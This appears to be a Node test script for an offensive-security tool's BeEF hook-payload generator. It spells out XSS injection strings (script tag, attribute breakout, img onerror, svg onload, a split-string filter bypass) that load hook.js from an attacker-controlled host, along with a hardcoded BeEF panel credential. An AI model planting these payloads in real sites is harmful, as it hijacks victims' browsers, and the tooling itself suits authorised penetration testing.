// Phase 4 (BEEF) tests — hook-payload generation (the deterministic, automatable part of BeEF).
// Deterministic (no network). Run: node scripts/test-beef.mjs
import { generatePayload, renderPayload, parsePayloadSpec } from '../src/services/payloads/templates.js';

let pass = 0, fail = 0;
const ok = (n, c, e = '') => { if (c) { pass++; console.log(`  ✅ ${n}`); } else { fail++; console.log(`  ❌ ${n} ${e}`); } };

console.log('\n[1] spec parsing');
ok('parse "beef 10.10.14.5" -> type beef + lhost', (() => { const s = parsePayloadSpec('beef 10.10.14.5'); return s.type === 'beef' && s.lhost === '10.10.14.5'; })());
ok('parse "beef 10.0.0.1 4000" -> custom port', (() => { const s = parsePayloadSpec('beef 10.0.0.1 4000'); return s.type === 'beef' && s.lport === '4000'; })());

console.log('\n[2] hook payload generation');
const p = generatePayload({ type: 'beef', lhost: '10.10.14.5' });
ok('hook URL points at attacker :3000', p.hookUrl === 'http://10.10.14.5:3000/hook.js');
ok('default port 3000 (not shell 4444)', p.lport === '3000');
ok('panel URL + non-default creds (beef blocks beef:beef)', p.panel === 'http://10.10.14.5:3000/ui/panel' && p.defaultCreds === 'beef:CypherM1nd!' && p.defaultCreds !== 'beef:beef');
ok('start command present', /beef-xss/.test(p.start));
ok('REST API snippet (login -> token -> hooks)', /api\/admin\/login/.test(p.restApi) && /api\/hooks/.test(p.restApi));

console.log('\n[3] the 5 delivery vectors (BeEF hooking = XSS delivery)');
const v = p.payloads;
ok('script tag', v['script tag (basic)'] === '<script src="http://10.10.14.5:3000/hook.js"></script>');
ok('attribute breakout', /^"><script src=/.test(v['attribute breakout']));
ok('img onerror dynamic load', /img src=x onerror=.*createElement\('script'\).*hook\.js/.test(v['img onerror (dynamic load)']));
ok('svg onload dynamic load', /svg onload=.*hook\.js/.test(v['svg onload (dynamic load)']));
ok('stored-XSS split bypass', /scr'\+'ipt/.test(v['stored-XSS split (filter bypass)']));
ok('all 5 vectors reference the same hook', Object.values(v).every((x) => x.includes('10.10.14.5:3000/hook.js')));

console.log('\n[4] custom port + render');
const p2 = generatePayload({ type: 'beef', lhost: 'attacker.tld', lport: '8080' });
ok('custom port honored', p2.hookUrl === 'http://attacker.tld:8080/hook.js');
const r = renderPayload(p);
ok('render shows hook + panel', /BeEF browser hook/.test(r) && /ui\/panel/.test(r));
ok('render lists delivery vectors', /script tag/.test(r) && /img onerror/.test(r));
ok('render includes REST drive-it block', /api\/hooks\?token=/.test(r));
ok('render is honest about victim requirement', /REQUIRES a victim/.test(r));

console.log('\n[5] unknown type still errors cleanly (beef added to the list)');
ok('error message lists beef', /beef/.test(generatePayload({ type: 'zzz' }).error));

console.log(`\n${fail === 0 ? '🎉 ALL PASS' : '💥 FAILURES'} — ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
